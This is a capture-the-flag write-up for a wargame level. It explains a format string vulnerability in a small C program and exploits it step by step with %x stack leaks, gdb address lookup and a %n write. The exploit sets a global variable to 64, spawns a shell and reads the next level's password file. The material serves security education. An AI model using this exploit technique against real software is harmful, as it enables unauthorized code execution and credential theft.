# Level 3

Here, we have a program reading on stdin again. But by decompiling the code, whe can see a fgets function reading 512 bytes and storing them in a buffer of 520. So... no overflow possible here.

```c
int m;

void v(void) {
  char buff [520];
  
  fgets(buff, 512, stdin);
  printf(buff);
  if (m == 64) {
    fwrite("Wait what?!\n", 1, 12, stdout);
    system("/bin/sh");
  }
  return;
}
```
**We can already see our goal here, the if statement with "m" and the value 64. If we can make "m" equal to 64, we win.** 

One line is in fact a little bit weird:
```c
printf(buff)
````
No format? Only one argument? Why?

Let's introduce our new exploit the **Format string attack**. This attack use this missuse of printf functions to interact with the memory. More precisely, we can use thoses threes format to play:
 - "%x" Read data from the stack
 - "%s" Read character strings from the memory
 - "%n" Write an integer to locations in the memory

An example:
```c
$ ./level3 <<< %d
512
```
Here, printf return the first value in the memory so it's working!

First, we have to find the emplacement of the printf buffer in the memory.
```sh
$ ./level3 <<< AAAA$(python -c "print('.%08x' * 4)")
AAAA.00000200.b7fd1ac0.b7ff37d0.41414141

$ ./level3 <<< AAAA%x%x%x%x
AAAA200b7fd1ac0b7ff37d041414141
```
Here, we can see our buffer in hexa, meaning we found the emplacement.
Now we can use this information to prepare our injection by shifting to the memory and try to access something.
```sh
$ ./level3 <<< AAAA%x%x%x%s
Segmentation fault (core dumped)
```
In this example, we are printing 0x41414141 who segfault because it does  not exist in the memory. But we can try with something existing like the argument of the system function "/bin/sh" (0x804860d).
```sh
$ ./level3 <<< $(printf "\x0d\x86\x04\x08")"%x%x%x | %s"
200b7fd1ac0b7ff37d0 | /bin/sh
```
Look it's our memory!!

Let's try now to modify "m" with this. For this we need the address of "m":
```sh
$ gdb -q ./level3 
Reading symbols from /home/user/level3/level3...(no debugging symbols found)...done.
(gdb) b v
Breakpoint 1 at 0x80484ad
(gdb) r
Starting program: /home/user/level3/level3 

Breakpoint 1, 0x080484ad in v ()
(gdb) dissas
Undefined command: "dissas".  Try "help".
(gdb) disass
Dump of assembler code for function v:
	...
	0x080484c7 <+35>:	call   0x80483a0 <fgets@plt>
	0x080484cc <+40>:	lea    -0x208(%ebp),%eax
	0x080484d2 <+46>:	mov    %eax,(%esp)
	0x080484d5 <+49>:	call   0x8048390 <printf@plt>
	0x080484da <+54>:	mov    0x804988c,%eax
	0x080484df <+59>:	cmp    $0x40,%eax
	0x080484e2 <+62>:	jne    0x8048518 <v+116>
	...   
End of assembler dump.
```
We can see that 64 (0x40) is compared with the address **0x804988c**, it's "m".

To modify the value, we have to use "%n" and we can play with "%x" and the field width to increment the value.

```sh
(gdb) run <<< $(printf "\x8c\x98\x04\x08")%x%x%x%n
(gdb) x/d 0x804988c
0x804988c <m>:  23
...
(gdb) run <<< $(printf "\x8c\x98\x04\x08")%x%x%50x%n
(gdb) x/d 0x804988c
0x804988c <m>:	65
...
(gdb) run <<< $(printf "\x8c\x98\x04\x08")%x%x%49x%n
(gdb) x/d 0x804988c
0x804988c <m>:	64
(gdb) c
Continuing.
Wait what?!
```
As we saw, "m" is now equal to 64 and we run the shell. So the final command is: 
```sh
$ (echo $(printf "\x8c\x98\x04\x08")%x%x%49x%n; cat) | ./level3 
�200b7fd1ac0                                         b7ff37d0
Wait what?!
whoami
level4
cat /home/user/level4/.pass
```

Sources:<br>
[OWASP - Format String Attack](https://owasp.org/www-community/attacks/Format_string_attack) <br>
[Hacking - The Art of exploitation](https://www.amazon.fr/Hacking-Art-Exploitation-Jon-Erickson/dp/1593271441)